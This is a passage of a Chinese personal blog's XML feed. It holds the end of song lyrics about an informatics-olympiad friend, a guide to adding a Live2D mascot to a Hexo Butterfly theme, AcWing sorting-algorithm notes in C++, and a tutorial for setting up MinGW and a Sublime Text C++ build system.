id="难忘记你笑脸温柔"><a href="#难忘记你笑脸温柔" class="headerlink" title="难忘记你笑脸温柔"></a>难忘记你笑脸温柔</h3><h3 id="命运如锁扣-路我代你走"><a href="#命运如锁扣-路我代你走" class="headerlink" title="命运如锁扣 路我代你走"></a>命运如锁扣 路我代你走</h3><h3 id="机房里-白板已擦净-将你字迹清除"><a href="#机房里-白板已擦净-将你字迹清除" class="headerlink" title="机房里 白板已擦净 将你字迹清除"></a>机房里 白板已擦净 将你字迹清除</h3><h3 id="独自地-在机房里做着你留的题目"><a href="#独自地-在机房里做着你留的题目" class="headerlink" title="独自地 在机房里做着你留的题目"></a>独自地 在机房里做着你留的题目</h3><h3 id="或许有时-还会突然怀念你给的帮助"><a href="#或许有时-还会突然怀念你给的帮助" class="headerlink" title="或许有时 还会突然怀念你给的帮助"></a>或许有时 还会突然怀念你给的帮助</h3><h3 id="你告诉我-绝不认输"><a href="#你告诉我-绝不认输" class="headerlink" title="你告诉我 绝不认输"></a>你告诉我 绝不认输</h3><h3 id="他们说的退役太沉重-你在路上追着你的梦"><a href="#他们说的退役太沉重-你在路上追着你的梦" class="headerlink" title="他们说的退役太沉重 你在路上追着你的梦"></a>他们说的退役太沉重 你在路上追着你的梦</h3><h3 id="前路会与过往不同-但精彩纷呈"><a href="#前路会与过往不同-但精彩纷呈" class="headerlink" title="前路会与过往不同 但精彩纷呈"></a>前路会与过往不同 但精彩纷呈</h3><h3 id="而我深夜刷题至三更-大赛过后睡眼正惺忪"><a href="#而我深夜刷题至三更-大赛过后睡眼正惺忪" class="headerlink" title="而我深夜刷题至三更 大赛过后睡眼正惺忪"></a>而我深夜刷题至三更 大赛过后睡眼正惺忪</h3><h3 id="恍然之间终于看懂-当年你笑容-谈何轻松"><a href="#恍然之间终于看懂-当年你笑容-谈何轻松" class="headerlink" title="恍然之间终于看懂 当年你笑容 谈何轻松"></a>恍然之间终于看懂 当年你笑容 谈何轻松</h3><h3 id="不如将你镌刻在心中-以足迹为路-以背影为灯"><a href="#不如将你镌刻在心中-以足迹为路-以背影为灯" class="headerlink" title="不如将你镌刻在心中 以足迹为路 以背影为灯"></a>不如将你镌刻在心中 以足迹为路 以背影为灯</h3><h3 id="去年今日-你的歌声-由我来传承"><a href="#去年今日-你的歌声-由我来传承" class="headerlink" title="去年今日 你的歌声 由我来传承"></a>去年今日 你的歌声 由我来传承</h3><h3 id="省选亚太精英旧路上过-春风拂袖暖阳正当空"><a href="#省选亚太精英旧路上过-春风拂袖暖阳正当空" class="headerlink" title="省选亚太精英旧路上过 春风拂袖暖阳正当空"></a>省选亚太精英旧路上过 春风拂袖暖阳正当空</h3><h3 id="定有某日OI赛中-荧幕之前-台阶之上-看奖牌芳容"><a href="#定有某日OI赛中-荧幕之前-台阶之上-看奖牌芳容" class="headerlink" title="定有某日OI赛中 荧幕之前 台阶之上 看奖牌芳容"></a>定有某日OI赛中 荧幕之前 台阶之上 看奖牌芳容</h3><h3 id="六月至七月-远方等候-你为我光荣"><a href="#六月至七月-远方等候-你为我光荣" class="headerlink" title="六月至七月 远方等候 你为我光荣"></a>六月至七月 远方等候 你为我光荣</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;我的一个OIer朋友&quot;&gt;&lt;a href=&quot;#我的一个OIer朋友&quot; class=&quot;headerlink&quot; title=&quot;我的一个OIer朋友&quot;&gt;&lt;/a&gt;我的一个OIer朋友&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本文来源：&lt;a href=&quot;https://www</summary>
      
    
    
    
    <category term="歌曲推荐" scheme="http://touristdaughter.cyou/categories/%E6%AD%8C%E6%9B%B2%E6%8E%A8%E8%8D%90/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo博客butterfly主题添加看板娘</title>
    <link href="http://touristdaughter.cyou/2025/04/20/Hexo%E5%8D%9A%E5%AE%A2butterfly%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E7%9C%8B%E6%9D%BF%E5%A8%98/"/>
    <id>http://touristdaughter.cyou/2025/04/20/Hexo%E5%8D%9A%E5%AE%A2butterfly%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E7%9C%8B%E6%9D%BF%E5%A8%98/</id>
    <published>2025-04-19T16:52:36.000Z</published>
    <updated>2025-04-21T15:08:08.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo博客butterfly主题添加看板娘"><a href="#Hexo博客butterfly主题添加看板娘" class="headerlink" title="Hexo博客butterfly主题添加看板娘"></a>Hexo博客butterfly主题添加看板娘</h1><h1 id="第一步：安装插件"><a href="#第一步：安装插件" class="headerlink" title="第一步：安装插件"></a>第一步：安装插件</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><h1 id="第二步：安装模型"><a href="#第二步：安装模型" class="headerlink" title="第二步：安装模型"></a>第二步：安装模型</h1><p>使用<code>npm install &#123;packagename&#125;</code>进行安装模型，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-shizuku -S</span><br></pre></td></tr></table></figure><h1 id="第三步：配置"><a href="#第三步：配置" class="headerlink" title="第三步：配置"></a>第三步：配置</h1><p>在站点配置文件<code>_config.yml</code>或者主题配置文件<code>_config.butterfly.yml</code>中新增如下内容：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Live2D</span></span><br><span class="line"><span class="comment">## https://github.com/EYHN/hexo-helper-live2d</span></span><br><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># enable: false</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span> <span class="comment"># 默认</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span> <span class="comment"># 插件在站点上的根目录(相对路径)</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span> <span class="comment"># 脚本文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span> <span class="comment"># 模型文件相对与插件根目录路径</span></span><br><span class="line">  <span class="comment"># scriptFrom: jsdelivr # jsdelivr CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: unpkg # unpkg CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # 你的自定义 url</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span> <span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span> <span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-wanko</span> <span class="comment"># 第二步下载的模型</span></span><br><span class="line">    <span class="comment"># use: wanko # 博客根目录/live2d_models/ 下的目录名</span></span><br><span class="line">    <span class="comment"># use: ./wives/wanko # 相对于博客根目录的路径</span></span><br><span class="line">    <span class="comment"># use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">150</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">300</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span> <span class="comment"># 手机中是否展示</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexo博客butterfly主题添加看板娘&quot;&gt;&lt;a href=&quot;#Hexo博客butterfly主题添加看板娘&quot; class=&quot;headerlink&quot; title=&quot;Hexo博客butterfly主题添加看板娘&quot;&gt;&lt;/a&gt;Hexo博客butterfly主题添加看</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="http://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>基础算法</title>
    <link href="http://touristdaughter.cyou/2025/04/17/1.%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/"/>
    <id>http://touristdaughter.cyou/2025/04/17/1.%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/</id>
    <published>2025-04-17T08:09:39.279Z</published>
    <updated>2025-04-17T08:21:50.471Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>powered by <a href="https://www.acwing.com/">AcWing</a><br>本文总结记录了我的<a href="https://www.acwing.com/activity/content/11/">基础算法</a>作业完成情况</p></blockquote><h1 id="第一讲-基础算法"><a href="#第一讲-基础算法" class="headerlink" title="第一讲 基础算法"></a>第一讲 基础算法</h1><blockquote><p>完成情况：20&#x2F;20<br>包括排序、二分、高精度、前缀和与差分、双指针算法、位运算、离散化、区间合并等内容。</p></blockquote><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">swap</span>(q[l], q[l + <span class="built_in">rand</span>() % (r - l + <span class="number">1</span>)]);</span><br><span class="line">    <span class="type">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, x = q[l];</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">        <span class="keyword">do</span> i ++ ; <span class="keyword">while</span> (q[i] &lt; x);</span><br><span class="line">        <span class="keyword">do</span> j -- ; <span class="keyword">while</span> (q[j] &gt; x);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(q[i], q[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">quick_sort</span>(q, l, j);</span><br><span class="line">    <span class="built_in">quick_sort</span>(q, j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">quick_sort</span>(q, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> q[N], tmp[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> ;</span><br><span class="line">    <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">merge_sort</span>(q, l, mid), <span class="built_in">merge_sort</span>(q, mid + <span class="number">1</span>, r);</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>, i = l , j = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (q[i] &lt;= q[j]) tmp[k ++ ] = q[i ++ ];</span><br><span class="line">        <span class="keyword">else</span> tmp[k ++ ] = q[j ++ ];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid) tmp[k ++ ] = q[i ++ ];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r) tmp[k ++ ] = q[j ++ ];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = l, j = <span class="number">0</span>; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">merge_sort</span>(q, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第二讲-数据结构"><a href="#第二讲-数据结构" class="headerlink" title="第二讲 数据结构"></a>第二讲 数据结构</h1><blockquote><p>完成情况：17&#x2F;17<br>包括单链表，双链表，栈，队列，单调栈，单调队列，KMP，Trie，并查集，堆，哈希表等内容。</p></blockquote><h1 id="第三讲-搜索与图论"><a href="#第三讲-搜索与图论" class="headerlink" title="第三讲 搜索与图论"></a>第三讲 搜索与图论</h1><blockquote><p>完成情况：17&#x2F;17<br>包括DFS，BFS，树与图的深度优先遍历，树与图的广度优先遍历，拓扑排序，Dijkstra，bellman-ford，spfa，Floyd，Prim，Kruskal，染色法判定二分图，匈牙利算法等内容。</p></blockquote><h1 id="第四讲-数学知识"><a href="#第四讲-数学知识" class="headerlink" title="第四讲 数学知识"></a>第四讲 数学知识</h1><blockquote><p>完成情况：26&#x2F;26<br>包括质数，约数，欧拉函数，快速幂，扩展欧几里得算法，中国剩余定理，高斯消元，求组合数，容斥原理，博弈论等内容。</p></blockquote><h1 id="第五讲-动态规划"><a href="#第五讲-动态规划" class="headerlink" title="第五讲 动态规划"></a>第五讲 动态规划</h1><blockquote><p>完成情况：11&#x2F;18<br>包括背包问题，线性DP，区间DP，计数类DP，数位统计DP，状态压缩DP，树形DP，记忆化搜索等内容。</p></blockquote><h1 id="第六讲-贪心"><a href="#第六讲-贪心" class="headerlink" title="第六讲 贪心"></a>第六讲 贪心</h1><blockquote><p>完成情况：2&#x2F;8<br>包括区间问题，Huffman树，排序不等式，绝对值不等式，推公式等内容。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;powered by &lt;a href=&quot;https://www.acwing.com/&quot;&gt;AcWing&lt;/a&gt;&lt;br&gt;本文总结记录了我的&lt;a href=&quot;https://www.acwing.com/activity/content/11/&quot;&gt;基础</summary>
      
    
    
    
    <category term="我的基础算法笔记" scheme="http://touristdaughter.cyou/categories/%E6%88%91%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="AcWing" scheme="http://touristdaughter.cyou/tags/AcWing/"/>
    
    <category term="Algorithm" scheme="http://touristdaughter.cyou/tags/Algorithm/"/>
    
    <category term="C++" scheme="http://touristdaughter.cyou/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>0.配置sublime c++环境</title>
    <link href="http://touristdaughter.cyou/2025/04/16/0.%E9%85%8D%E7%BD%AEsublime%20c++%E7%8E%AF%E5%A2%83/"/>
    <id>http://touristdaughter.cyou/2025/04/16/0.%E9%85%8D%E7%BD%AEsublime%20c++%E7%8E%AF%E5%A2%83/</id>
    <published>2025-04-16T13:24:23.118Z</published>
    <updated>2025-04-17T08:17:21.857Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0-配置sublime-c-环境"><a href="#0-配置sublime-c-环境" class="headerlink" title="0.配置sublime c++环境"></a>0.配置sublime c++环境</h1><h2 id="一、下载MinGW文件"><a href="#一、下载MinGW文件" class="headerlink" title="一、下载MinGW文件"></a>一、下载<code>MinGW</code>文件</h2><h3 id="1-下载mingw-get-setup"><a href="#1-下载mingw-get-setup" class="headerlink" title="1.下载mingw-get-setup"></a>1.下载<code>mingw-get-setup</code></h3><p>网址：<code>https://sourceforge.net/projects/mingw/</code><br>由于这是境外网站，请自行解决连接问题（下载的文件仅84.5KB）<br><img src="/img/sub1.png"></p><h3 id="2-双击运行，一直continue"><a href="#2-双击运行，一直continue" class="headerlink" title="2.双击运行，一直continue"></a>2.双击运行，一直<code>continue</code></h3><p><img src="/img/sub2.png"></p><h3 id="3-安装完成后显示MinGW-Installation-Manager的页面"><a href="#3-安装完成后显示MinGW-Installation-Manager的页面" class="headerlink" title="3.安装完成后显示MinGW Installation Manager的页面"></a>3.安装完成后显示<code>MinGW Installation Manager</code>的页面</h3><p><img src="/img/sub3.png"></p><h3 id="4-单击mingw32-base和mingw-gcc-g-左边的方框，选择Mark-for-installation"><a href="#4-单击mingw32-base和mingw-gcc-g-左边的方框，选择Mark-for-installation" class="headerlink" title="4.单击mingw32-base和mingw-gcc-g++左边的方框，选择Mark for installation"></a>4.单击<code>mingw32-base</code>和<code>mingw-gcc-g++</code>左边的方框，选择<code>Mark for installation</code></h3><p><img src="/img/sub4.png"></p><h3 id="5-单击菜单栏左上角Installation，选择Apply-Changes"><a href="#5-单击菜单栏左上角Installation，选择Apply-Changes" class="headerlink" title="5.单击菜单栏左上角Installation，选择Apply Changes"></a>5.单击菜单栏左上角<code>Installation</code>，选择<code>Apply Changes</code></h3><p><img src="/img/sub5.png"></p><h3 id="6-在弹出来的界面单击Apply"><a href="#6-在弹出来的界面单击Apply" class="headerlink" title="6.在弹出来的界面单击Apply"></a>6.在弹出来的界面单击<code>Apply</code></h3><p><img src="/img/sub6.png"></p><h3 id="7、等待下载完成-下载完成，Close退出"><a href="#7、等待下载完成-下载完成，Close退出" class="headerlink" title="7、等待下载完成;下载完成，Close退出"></a>7、等待下载完成;下载完成，<code>Close</code>退出</h3><p><img src="/img/sub7.png"></p><h2 id="二、添加环境变量（以Win11为例）"><a href="#二、添加环境变量（以Win11为例）" class="headerlink" title="二、添加环境变量（以Win11为例）"></a>二、添加环境变量（以Win11为例）</h2><h3 id="1-右键此电脑，选择属性。"><a href="#1-右键此电脑，选择属性。" class="headerlink" title="1.右键此电脑，选择属性。"></a>1.右键此电脑，选择属性。</h3><p><img src="/img/sub8.png"></p><h3 id="2-在相关链接里选择高级系统设置"><a href="#2-在相关链接里选择高级系统设置" class="headerlink" title="2.在相关链接里选择高级系统设置"></a>2.在相关链接里选择高级系统设置</h3><p><img src="/img/sub9.png"></p><h3 id="3-在弹出的窗口单击环境变量"><a href="#3-在弹出的窗口单击环境变量" class="headerlink" title="3.在弹出的窗口单击环境变量"></a>3.在弹出的窗口单击环境变量</h3><p><img src="/img/sub10.png"></p><h3 id="4-单击选中系统变量里的Path，然后单击编辑"><a href="#4-单击选中系统变量里的Path，然后单击编辑" class="headerlink" title="4.单击选中系统变量里的Path，然后单击编辑"></a>4.单击选中系统变量里的<code>Path</code>，然后单击编辑</h3><p><img src="/img/sub11.png"></p><h3 id="5-新建path"><a href="#5-新建path" class="headerlink" title="5.新建path"></a>5.新建path</h3><h4 id="①在弹出的窗口单击新建，并输入你安装MingGW的地址，后面加一个-bin（二进制文件）"><a href="#①在弹出的窗口单击新建，并输入你安装MingGW的地址，后面加一个-bin（二进制文件）" class="headerlink" title="①在弹出的窗口单击新建，并输入你安装MingGW的地址，后面加一个/bin（二进制文件）"></a>①在弹出的窗口单击新建，并输入你安装<code>MingGW</code>的地址，后面加一个<code>/bin</code>（二进制文件）</h4><p>我是<code>C:\MinGW\bin</code><br><img src="/img/sub12.png"></p><h4 id="②连续点击确定以保存刚才的操作"><a href="#②连续点击确定以保存刚才的操作" class="headerlink" title="②连续点击确定以保存刚才的操作"></a>②连续点击确定以保存刚才的操作</h4><h3 id="6-右击Win徽标键，选择Windows-终端（管理员），输入gcc-v"><a href="#6-右击Win徽标键，选择Windows-终端（管理员），输入gcc-v" class="headerlink" title="6.右击Win徽标键，选择Windows 终端（管理员），输入gcc -v"></a>6.右击<code>Win</code>徽标键，选择<code>Windows 终端（管理员）</code>，输入<code>gcc -v</code></h3><p><img src="/img/sub13.png"></p><h4 id="如果有以下样式反馈说明环境变量配置成功"><a href="#如果有以下样式反馈说明环境变量配置成功" class="headerlink" title="如果有以下样式反馈说明环境变量配置成功"></a>如果有以下样式反馈说明环境变量配置成功</h4><p><img src="/img/sub14.png"></p><h4 id="如果出现以下内容，则返回一-5-步骤-重新Apply"><a href="#如果出现以下内容，则返回一-5-步骤-重新Apply" class="headerlink" title="如果出现以下内容，则返回一.5.步骤 重新Apply"></a>如果出现以下内容，则返回<code>一.5.</code>步骤 重新<code>Apply</code></h4><p><img src="/img/sub15.png"></p><h2 id="三、配置Sublime-Text"><a href="#三、配置Sublime-Text" class="headerlink" title="三、配置Sublime Text"></a>三、配置Sublime Text</h2><h3 id="1-下载并安装Sublime"><a href="#1-下载并安装Sublime" class="headerlink" title="1.下载并安装Sublime"></a>1.下载并安装<code>Sublime</code></h3><p>用谷歌搜索官网（因为有些网站域名可能会变），此处附上官网：<code>https://www.sublimetext.com/</code><br>不演示安装过程，中途勾选<code>add to explorer context menu</code>，意思是右键菜单会出现“Open with Sublime Text”（用Sublime打开）的选项</p><h3 id="2-找到你刚才设置的Sublime-Text安装目录，打开sublime-text-exe（sublime本体）"><a href="#2-找到你刚才设置的Sublime-Text安装目录，打开sublime-text-exe（sublime本体）" class="headerlink" title="2.找到你刚才设置的Sublime Text安装目录，打开sublime_text.exe（sublime本体）"></a>2.找到你刚才设置的<code>Sublime Text</code>安装目录，打开<code>sublime_text.exe</code>（sublime本体）</h3><p><img src="/img/sub16.png"></p><h3 id="3-单击菜单栏的Tools，选择Build-System-New-Build-System"><a href="#3-单击菜单栏的Tools，选择Build-System-New-Build-System" class="headerlink" title="3.单击菜单栏的Tools，选择Build System - New Build System"></a>3.单击菜单栏的<code>Tools</code>，选择<code>Build System</code> - <code>New Build System</code></h3><p><img src="/img/sub17.png"></p><h3 id="4-用以下代码替换untitled-sublime-build文件中的所有内容"><a href="#4-用以下代码替换untitled-sublime-build文件中的所有内容" class="headerlink" title="4.用以下代码替换untitled.sublime-build文件中的所有内容"></a>4.用以下代码替换<code>untitled.sublime-build</code>文件中的所有内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;cmd&quot;: [&quot;g++&quot;, &quot;-Wall&quot;, &quot;$&#123;file&#125;&quot;,&quot;-std=c++11&quot;, &quot;-fexec-charset=gbk&quot;, &quot;-o&quot;,&quot;$&#123;file_path&#125;/$&#123;file_base_name&#125;&quot;],</span><br><span class="line">&quot;file_regex&quot;: &quot;^(..[^:]*):([0-9]+):?([0-9]+)?:?(.*)$&quot;,</span><br><span class="line">&quot;working_dir&quot;: &quot;$&#123;file_path&#125;&quot;,</span><br><span class="line">&quot;selector&quot;: &quot;source.c, source.c++&quot;,</span><br><span class="line">&quot;shell&quot;: true,</span><br><span class="line">&quot;encoding&quot;:&quot;cp936&quot;,</span><br><span class="line">&quot;variants&quot;:</span><br><span class="line">[</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;Compile Only&quot;,</span><br><span class="line">&quot;cmd&quot;: [&quot;cmd&quot;,&quot;/C&quot;,&quot;g++&quot;, &quot;-Wall&quot;, &quot;$&#123;file&#125;&quot;,&quot;-std=c++11&quot;, &quot;-fexec-charset=gbk&quot;, &quot;-o&quot;,&quot;$&#123;file_path&#125;/$&#123;file_base_name&#125;&quot;],</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;Run Only&quot;,</span><br><span class="line">&quot;cmd&quot;: [&quot;start&quot;,&quot;cmd&quot;,&quot;/c&quot;, &quot;$&#123;file_base_name&#125; &amp; echo. &amp; pause&quot;],</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;Compile &amp; Run&quot;,</span><br><span class="line">&quot;cmd&quot;: [&quot;cmd&quot;,&quot;/C&quot;,&quot;g++&quot;, &quot;-Wall&quot;, &quot;$&#123;file&#125;&quot;,&quot;-std=c++11&quot;, &quot;-fexec-charset=gbk&quot;, &quot;-o&quot;,&quot;$&#123;file_path&#125;/$&#123;file_base_name&#125;&quot;, &quot;&amp;&amp;&quot;,&quot;start&quot;,&quot;cmd&quot;,&quot;/c&quot;, &quot;$&#123;file_base_name&#125; &amp; echo. &amp; pause&quot;],</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-Ctrl-S保存，命名文件为CPP-sublime-build"><a href="#5-Ctrl-S保存，命名文件为CPP-sublime-build" class="headerlink" title="5.Ctrl + S保存，命名文件为CPP.sublime-build"></a>5.<code>Ctrl + S</code>保存，命名文件为<code>CPP.sublime-build</code></h3><p><img src="/img/sub18.png"></p><h3 